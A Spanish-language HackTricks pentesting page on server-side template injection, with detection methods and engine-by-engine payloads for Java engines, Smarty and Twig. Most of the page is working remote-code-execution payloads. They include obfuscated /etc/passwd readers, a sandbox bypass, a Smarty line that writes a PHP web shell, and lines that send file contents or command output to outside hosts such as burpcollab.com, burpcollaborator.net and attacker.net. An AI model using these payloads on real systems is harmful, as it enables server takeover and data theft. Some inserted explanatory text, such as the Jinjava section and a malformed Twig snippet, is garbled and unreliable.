# SSTI (Inyecci√≥n de plantillas en el lado del servidor)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com) es el evento de ciberseguridad m√°s relevante en **Espa√±a** y uno de los m√°s importantes en **Europa**. Con **la misi√≥n de promover el conocimiento t√©cnico**, este congreso es un punto de encuentro para profesionales de la tecnolog√≠a y la ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## ¬øQu√© es la inyecci√≥n de plantillas en el lado del servidor?

La inyecci√≥n de plantillas en el lado del servidor ocurre cuando un atacante es capaz de utilizar la sintaxis nativa de la plantilla para inyectar una carga maliciosa en una plantilla, que luego se ejecuta en el lado del servidor.

Los **motores de plantillas** est√°n dise√±ados para **generar p√°ginas web** combinando plantillas **fijas** con datos **vol√°tiles**. Los ataques de inyecci√≥n de plantillas en el lado del servidor pueden ocurrir cuando la **entrada del usuario** se concatena directamente **en una plantilla**, en lugar de pasarla como datos. Esto permite a los atacantes **inyectar directivas de plantilla arbitrarias** para manipular el motor de plantillas, lo que a menudo les permite tomar **el control completo del servidor**.

Un ejemplo de c√≥digo vulnerable se muestra a continuaci√≥n:
```php
$output = $twig->render("Dear " . $_GET['name']);
```
En el ejemplo anterior, **parte de la plantilla** en s√≠ misma est√° siendo **generada din√°micamente** usando el par√°metro `GET` `name`. Como la sintaxis de la plantilla se eval√∫a en el lado del servidor, esto potencialmente permite a un atacante colocar una carga √∫til de inyecci√≥n de plantilla en el lado del servidor dentro del par√°metro `name` de la siguiente manera:
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
## Construyendo un ataque de inyecci√≥n de plantilla en el lado del servidor

![](../../.gitbook/assets/ssti-methodology-diagram.png)

### Detectar

Al igual que con cualquier vulnerabilidad, el primer paso hacia la explotaci√≥n es poder encontrarla. Quiz√°s el enfoque inicial m√°s simple sea intentar **fuzzear la plantilla** inyectando una secuencia de caracteres especiales com√∫nmente utilizados en expresiones de plantilla, como el pol√≠glota **`${{<%[%'"}}%\`.**\
Para comprobar si el servidor es vulnerable, debe **detectar las diferencias** entre la respuesta con **datos regulares** en el par√°metro y el **payload dado**.\
Si se produce un **error**, ser√° bastante f√°cil averiguar que **el servidor es vulnerable** e incluso qu√© **motor se est√° ejecutando**. Pero tambi√©n podr√≠a encontrar un servidor vulnerable si esperaba que reflejara el payload dado y no lo est√° haciendo o si hay algunos caracteres **faltantes** en la respuesta.

**Detectar - Contexto de texto plano**

La entrada dada se est√° **renderizando y reflejando** en la respuesta. Esto es f√°cilmente **confundido con una vulnerabilidad simple** de [**XSS**](../xss-cross-site-scripting/), pero es f√°cil de diferenciar si intenta establecer **operaciones matem√°ticas** dentro de una expresi√≥n de plantilla:
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```
**Detectar - Contexto de c√≥digo**

En estos casos, la **entrada del usuario** se est√° colocando **dentro** de una **expresi√≥n de plantilla**:
```python
engine.render("Hello {{"+greeting+"}}", data)
```
El acceso a la p√°gina puede ser similar a: `http://vulnerable-website.com/?greeting=data.username`

Si **cambias** el par√°metro **`greeting`** por un **valor diferente**, la **respuesta no contendr√° el nombre de usuario**, pero si accedes a algo como: `http://vulnerable-website.com/?greeting=data.username}}hello` entonces, **la respuesta contendr√° el nombre de usuario** (si los caracteres de cierre de la expresi√≥n de la plantilla fueran **`}}`**).\
Si se produce un **error** durante estas pruebas, ser√° m√°s f√°cil encontrar que el servidor es vulnerable.

### Identificaci√≥n

Una vez que se ha detectado el potencial de inyecci√≥n de plantillas, el siguiente paso es identificar el motor de plantillas.\
Aunque hay una gran cantidad de lenguajes de plantillas, muchos de ellos utilizan una sintaxis muy similar que se elige espec√≠ficamente para no chocar con los caracteres HTML.

Si tienes suerte, el servidor estar√° **imprimiendo los errores** y podr√°s encontrar el **motor** utilizado **dentro** de los errores. Algunas cargas √∫tiles posibles que pueden causar errores son:

| `${}`       | `{{}}`       | `<%= %>`        |
| ----------- | ------------ | --------------- |
| `${7/0}`    | `{{7/0}}`    | `<%= 7/0 %>`    |
| `${foobar}` | `{{foobar}}` | `<%= foobar %>` |
| `${7*7}`    | `{{7*7}}`    | \`\`            |

De lo contrario, deber√°s probar manualmente diferentes cargas √∫tiles espec√≠ficas del lenguaje y estudiar c√≥mo son interpretadas por el motor de plantillas. Una forma com√∫n de hacer esto es inyectar operaciones matem√°ticas arbitrarias utilizando sintaxis de diferentes motores de plantillas. Luego puedes observar si se eval√∫an correctamente. Para ayudar en este proceso, puedes usar un √°rbol de decisiones similar al siguiente:

![](<../../.gitbook/assets/image (272).png>)

### Explotaci√≥n

**Leer**

El primer paso despu√©s de encontrar la inyecci√≥n de plantillas e identificar el motor de plantillas es leer la documentaci√≥n. Las √°reas clave de inter√©s son:

* Secciones 'Para autores de plantillas' que cubren la sintaxis b√°sica.
* 'Consideraciones de seguridad' - es probable que quien desarroll√≥ la aplicaci√≥n que est√°s probando no haya le√≠do esto, y puede contener algunas pistas √∫tiles.
* Listas de m√©todos, funciones, filtros y variables integrados.
* Listas de extensiones/plugins - algunos pueden estar habilitados de forma predeterminada.

**Explorar**

Suponiendo que no se han presentado exploits, el siguiente paso es **explorar el entorno** para averiguar exactamente a qu√© **tienes acceso**. Puedes esperar encontrar tanto **objetos predeterminados** proporcionados por el motor de plantillas, como **objetos espec√≠ficos de la aplicaci√≥n** pasados a la plantilla por el desarrollador. Muchos sistemas de plantillas exponen un objeto 'self' o de espacio de nombres que contiene todo en el √°mbito, y una forma idiom√°tica de listar los atributos y m√©todos de un objeto.

Si no hay un objeto self integrado, tendr√°s que probar nombres de variables mediante [SecLists](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt) y la colecci√≥n de listas de palabras de Burp Intruder.

Los objetos suministrados por el desarrollador son particularmente propensos a contener informaci√≥n sensible, y pueden variar entre diferentes plantillas dentro de una aplicaci√≥n, por lo que este proceso debe aplicarse idealmente a cada plantilla individualmente.

**Atacar**

En este punto, deber√≠as tener una **idea firme de la superficie de ataque disponible** y poder proceder con t√©cnicas tradicionales de auditor√≠a de seguridad, revisando cada funci√≥n en busca de vulnerabilidades explotables. Es importante abordar esto en el contexto de la aplicaci√≥n m√°s amplia - algunas funciones pueden ser utilizadas para explotar caracter√≠sticas espec√≠ficas de la aplicaci√≥n. Los ejemplos a seguir utilizar√°n la inyecci√≥n de plantillas para desencadenar la creaci√≥n arbitraria de objetos, la lectura/escritura arbitraria de archivos, la inclusi√≥n remota de archivos, la divulgaci√≥n de informaci√≥n y las vulnerabilidades de escalada de privilegios.

## Herramientas

### [Tplmap](https://github.com/epinna/tplmap)
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
## Exploits

### Gen√©rico

En esta **lista de palabras** puedes encontrar **variables definidas** en los entornos de algunos de los motores mencionados a continuaci√≥n:

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)

### Java

**Java - Inyecci√≥n b√°sica**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```
**Java - Obtener las variables de entorno del sistema**

Para obtener las variables de entorno del sistema en Java, podemos utilizar la clase `System` y su m√©todo `getenv()`. Este m√©todo devuelve un objeto `Map` que contiene todas las variables de entorno del sistema y sus valores.

```java
Map<String, String> env = System.getenv();
for (String envName : env.keySet()) {
    System.out.format("%s=%s%n", envName, env.get(envName));
}
```

Este c√≥digo imprimir√° todas las variables de entorno del sistema y sus valores en la consola.
```java
${T(java.lang.System).getenv()}
```
**Java - Obtener /etc/passwd**
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

Puedes probar tus payloads en [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (legacy)`
* `${7*'7'} Nothing`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - Bypass de Sandbox**

‚ö†Ô∏è Solo funciona en versiones de Freemarker inferiores a 2.3.30
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**M√°s informaci√≥n**

* En la secci√≥n de FreeMarker de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**M√°s informaci√≥n**

* En la secci√≥n Velocity de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)

### Thymeleaf (Java)

La expresi√≥n de prueba t√≠pica para SSTI es `${7*7}`. Esta expresi√≥n tambi√©n funciona en Thymeleaf. Si desea lograr la ejecuci√≥n remota de c√≥digo, puede usar una de las siguientes expresiones de prueba:

* SpringEL: `${T(java.lang.Runtime).getRuntime().exec('calc')}`
* OGNL: `${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}`

Sin embargo, como mencionamos antes, las expresiones solo funcionan en atributos especiales de Thymeleaf. Si es necesario usar una expresi√≥n en una ubicaci√≥n diferente en la plantilla, Thymeleaf admite _inlineado de expresiones_. Para usar esta funci√≥n, debe colocar una expresi√≥n dentro de `[[...]]` o `[(...)]` (seleccione uno u otro seg√∫n si necesita escapar s√≠mbolos especiales). Por lo tanto, una carga √∫til de detecci√≥n SSTI simple para Thymeleaf ser√≠a `[[${7*7}]]`.

Las posibilidades de que la carga √∫til de detecci√≥n anterior funcione son, sin embargo, muy bajas. Las vulnerabilidades de SSTI generalmente ocurren cuando una plantilla se genera din√°micamente en el c√≥digo. Thymeleaf, por defecto, no permite tales plantillas generadas din√°micamente y todas las plantillas deben crearse antes. Por lo tanto, si un desarrollador quiere crear una plantilla a partir de una cadena _sobre la marcha_, necesitar√≠a crear su propio TemplateResolver. Esto es posible pero ocurre muy raramente.

Si profundizamos en la documentaci√≥n del motor de plantillas Thymeleaf, encontraremos una caracter√≠stica interesante llamada _**preprocesamiento de expresiones**_. Las expresiones colocadas entre doble gui√≥n bajo (`__...__`) se preprocesan y el resultado del preprocesamiento se utiliza como parte de la expresi√≥n durante el procesamiento regular. Aqu√≠ hay un ejemplo oficial de la documentaci√≥n de Thymeleaf:
```java
#{selection.__${sel.code}__}
```
**Ejemplo vulnerable**
```markup
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>

http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**M√°s informaci√≥n**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Marco de trabajo Spring (Java)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**Bypassar filtros**

Se pueden usar m√∫ltiples expresiones de variables, si `${...}` no funciona, prueba con `#{...}`, `*{...}`, `@{...}` o `~{...}`.

* Leer `/etc/passwd`
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* Script personalizado para la generaci√≥n de payloads
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}' 

count = 1
for i in converted:
    if count == 1:
        base_payload += f"(T(java.lang.Character).toString({i}).concat"
        count += 1
    elif count == len(converted):
        base_payload += f"(T(java.lang.Character).toString({i})))"
    else:
        base_payload += f"(T(java.lang.Character).toString({i})).concat"
        count += 1

print(base_payload + end_payload)
```
**M√°s informaci√≥n**

* [Thymleaf SSTI](https://javamana.com/2021/11/21071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### Manipulaci√≥n de vistas de Spring (Java)
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble (Java)

* `{{ someString.toUPPERCASE() }}`

Versi√≥n antigua de Pebble ( < versi√≥n 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
Nueva versi√≥n de Pebble:
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}


{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```
### Jinjava (Java)

Jinjava es un motor de plantillas Java que admite la ejecuci√≥n de c√≥digo Java en plantillas. Es compatible con la mayor√≠a de las caracter√≠sticas de la sintaxis de plantillas de Django y agrega algunas caracter√≠sticas adicionales, como la ejecuci√≥n de c√≥digo Java en plantillas. 

#### Ejemplo de uso

```java
import com.hubspot.jinjava.Jinjava;
import java.util.HashMap;
import java.util.Map;

public class Main {
    public static void main(String[] args) {
        Jinjava jinjava = new Jinjava();
        Map<String, Object> context = new HashMap<>();
        context.put("name", "Jinjava");
        String template = "Hello {{ name }}!";
        String renderedTemplate = jinjava.render(template, context);
        System.out.println(renderedTemplate);
    }
}
```

#### Ejecuci√≥n de c√≥digo Java

Jinjava admite la ejecuci√≥n de c√≥digo Java en plantillas utilizando la sintaxis `{{ java_code }}`. Por ejemplo, el siguiente c√≥digo Java se puede ejecutar en una plantilla Jinjava:

```java
{% set x = 1 %}
{% set y = 2 %}
{% set result = x + y %}
{{ result }}
```

Esto imprimir√° `3` en la plantilla renderizada.
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
Jinjava es un proyecto de c√≥digo abierto desarrollado por Hubspot, disponible en [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)

**Jinjava - Ejecuci√≥n de comandos**

Solucionado por [https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**M√°s informaci√≥n**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* Delimitadores de sentencia `{% %}`
* Delimitadores de expresi√≥n `{{ }}`
* Delimitadores de comentario `{# #}`
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

Busque "com.hubspot.content.hubl.context.TemplateContextRequest" y descubra el [proyecto Jinjava en Github](https://github.com/HubSpot/jinjava/).
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the 







{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**M√°s informaci√≥n**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### Lenguaje de Expresi√≥n - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

EL proporciona un mecanismo importante para permitir que la capa de presentaci√≥n (p√°ginas web) se comunique con la l√≥gica de la aplicaci√≥n (beans administrados). EL es utilizado por **varias tecnolog√≠as JavaEE**, como la tecnolog√≠a JavaServer Faces, la tecnolog√≠a JavaServer Pages (JSP) y la Inyecci√≥n de Dependencias y Contextos para Java EE (CDI).\
Consulte la siguiente p√°gina para obtener m√°s informaci√≥n sobre la **explotaci√≥n de los int√©rpretes EL**:

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

Este bypass del Security Manager fue tomado de este [**writeup**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/).
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
    cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
    assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
    cmd = "whoami";
    out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
    cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
    java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad m√°s relevante en **Espa√±a** y uno de los m√°s importantes en **Europa**. Con la misi√≥n de promover el conocimiento t√©cnico, este congreso es un punto de encuentro para profesionales de la tecnolog√≠a y la ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

##

### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**M√°s informaci√≥n**

* En la secci√≥n de Smarty de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = Error`
* `{{foobar}} Nothing`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
```
**Twig - Formato de plantilla**

Twig es un motor de plantillas moderno y flexible para PHP. Es utilizado por Symfony2, Drupal8 y muchas otras herramientas de PHP. Twig utiliza una sintaxis simple y f√°cil de aprender que permite a los desarrolladores crear plantillas de manera r√°pida y eficiente. 

Twig es un lenguaje de plantillas seguro por defecto, lo que significa que no permite la ejecuci√≥n de c√≥digo arbitrario. Sin embargo, a√∫n es posible realizar inyecciones de plantillas del lado del servidor (SSTI) en Twig si se utilizan mal algunas de sus funciones. 

Para evitar SSTI en Twig, es importante asegurarse de que todas las variables que se utilizan en las plantillas sean seguras y no contengan c√≥digo malicioso. Adem√°s, se deben evitar las funciones peligrosas de Twig, como `eval`, `include`, `source`, `template_from_string`, entre otras. 

En resumen, Twig es una herramienta poderosa y segura para crear plantillas en PHP, siempre y cuando se utilice de manera responsable y se eviten las funciones peligrosas.
```php
$output = $twig > render (
  'Dear' . $_GET['custom_greeting'],
  array("first_name" => $user.first_name)
);

$output = $twig > render (
  "Dear {first_name}",
  array("first_name" => $user.first_name)
);
```
**M√°s informaci√≥n**

* En la secci√≥n Twig y Twig (Sandboxed) de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

### Plates (PHP)

Plates est√° inspirado en Twig pero es un motor de plantillas PHP nativo en lugar de un motor de plantillas compilado.

controlador:
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
# Inyecci√≥n de plantillas en el lado del servidor (SSTI)

